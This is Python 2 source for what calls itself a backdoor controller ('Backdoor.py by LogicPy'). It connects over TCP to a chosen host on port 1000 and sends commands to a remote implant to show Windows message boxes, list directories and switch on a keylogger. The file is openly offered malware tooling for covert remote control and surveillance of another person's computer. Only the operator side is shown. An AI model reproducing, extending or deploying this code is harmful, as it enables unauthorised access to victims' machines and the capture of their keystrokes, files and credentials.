import socket
import sys

response = 0

def header():
	print """

			 __________
			|  __  __  |
			| |  ||  | |
			| |  ||  | |
			| |__||__| |
			|  __  __()|
			| |  ||  | |
			| |  ||  | |
			| |  ||  | |
			| |  ||  | |
			| |__||__| |
			|__________|
	 _____         _     _                       
	| __  |___ ___| |_ _| |___ ___ ___   ___ _ _ 
	| __ -| .'|  _| '_| . | . | . |  _|_| . | | |
	|_____|__,|___|_,_|___|___|___|_| |_|  _|_  |
	                                    |_| |___|
	By LogicPy
	---------------------------------------------
"""

def connect():
	global sock
	global IPSelect
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	host = (ip, 1000)
	sock.connect(host)

def loop():
	global response

	while(True):
		# Enter command
		cmd = raw_input(" Enter Command: ")

		# Command to function
		if cmd == "test":
			sock.sendall('test')
			response()
			break
		elif cmd == "exit":
			sys.exit()
		elif cmd == "keylog":
			sock.sendall('keylog')
			response()
			break
		elif "alert" in cmd:
			sock.sendall(cmd)
			response()
			break
		elif "dir" in cmd:
			sock.sendall(cmd)
			response()
			break
		elif cmd == "help":
			print """\n 	-- Commands --
	test - Test Connectivity
	exit - Close Communication
	alert (message) - Display Windows Message
	dir (directory) - View Directory
	keylog - Enable Keylogger
			"""
		else:
			print "\n	Invalid Command (Type 'help' for commands)\n"
	reconnect()

def IPSelect():
	global ip
	ip = raw_input(" Enter Host/IP: ")

def response():
	global sock
	data = sock.recv(1024)
	print '\n%s\n' % data
	sock.close()

def reconnect():
	connect()
	loop()

header()
IPSelect()
# [1] Connect to Host
connect()
# [2] Command input loop
loop()